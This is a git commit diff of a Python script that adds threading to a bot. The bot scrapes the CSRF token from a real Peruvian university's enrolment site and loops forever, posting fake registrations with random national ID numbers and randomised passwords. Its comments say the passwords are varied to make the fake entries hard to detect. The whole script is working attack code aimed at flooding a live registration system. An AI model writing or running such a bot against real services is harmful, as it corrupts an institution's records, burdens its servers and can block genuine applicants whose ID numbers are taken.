976c12329209e9b00bf9fce89e59c29f0ad3bee7
dahsser <dilogi7@gmail.com>
2018-01-10 17:51:08 -0500

    Threads were added

--- refilling_Inscripciones.py
+++ refilling_Inscripciones.py
@@ -2,9 +2,12 @@ from bs4 import BeautifulSoup
 import requests
 import random
 import time
+import hashlib
+import threading
+
 headers = {
     "Origin":"http://www.inscripciones.uni.edu.pe",
-    "Upgrade-Insecure-Requests":1,
+    "Upgrade-Insecure-Requests":"1",
     "Content-Type":"application/x-www-form-urlencoded",
     "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
     "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
@@ -12,30 +15,42 @@ headers = {
     "Accept-Encoding":"gzip, deflate",
     "Accept-Language":"es-ES,es;q=0.9,en;q=0.8"
 }
+cont = 0
+def make_request():
+    global cont
+    while True :
+        r = requests.get("http://www.inscripciones.uni.edu.pe/login");
+        text = r.text
+        soup = BeautifulSoup(text , features = "lxml").body
+        token = soup.find_all('input')[0]['value']
+        dni_str = "7"+str(random.randint(1000000,9999999)) # people from Peru [16> years] now have a ID starting with 7 I think
+        len_password = random.randint(8,15)
+        password = hashlib.sha256(str(random.randint(1000000000,9999999999)).encode()).hexdigest()[:len_password] # Making difficult to find wich one is fake
+        data = {
+            '_token':token,
+            'dni': dni_str,
+            'password': password,
+            'password_confirmation': password
+        }
+        try:
+            r = requests.post('http://www.inscripciones.uni.edu.pe/register', data = data, headers=headers, cookies=r.cookies)
+            if r.status_code==200:
+                cont+=1
+                #if cont%50==0:
+                print("\r{:d} requests enviados".format(cont),end='')
+                time.sleep(0.100)
+            else:
+                print("Error:", r.status_code)
 
-"""with open("lastOne.txt","r") as f:
-    dni = int(f.read())"""
+        except ValueError:
+            print("Error: retrying http post")
+            time.sleep(2)
 
-while True :
-    r = requests.get("http://www.inscripciones.uni.edu.pe/login");
-    text = r.text
-    soup = BeautifulSoup(text , features = "lxml").body
-    token = soup.find_all('input')[0]['value']
-    dni_str = "7"+str(random.randint(1000000,9999999)) # people from Peru now have a ID starting with 7
-    password = str(random.randint(100000,999999)) # Making difficult to find wich one is fake
-    data = {
-        '_token':token,
-        'dni': dni_str,
-        'password': password,
-        'password_confirmation': password
-    }
-    try:
-        r = requests.post('http://www.inscripciones.uni.edu.pe/register', data = data, headers=headers, cookies=r.cookies)
-    except ValueError:
-        print("Error: retrying http post")
-        time.sleep(3)
-    #if dni%50==0:
-    print(str(dni_str)+":"+ "Ok" if r.status_code==200 else "Error")
-    """with open("lastOne.txt","w") as f:
-            f.write(str(dni))"""
-    #dni+=1
+Nhilos = 5
+hilos = []
+for i in range(Nhilos):
+    hilos.append(threading.Thread(target=make_request))
+    print("Comenzando hilo:",i+1)
+    hilos[i].start()
+for i in range(Nhilos):
+    hilos[i].join()
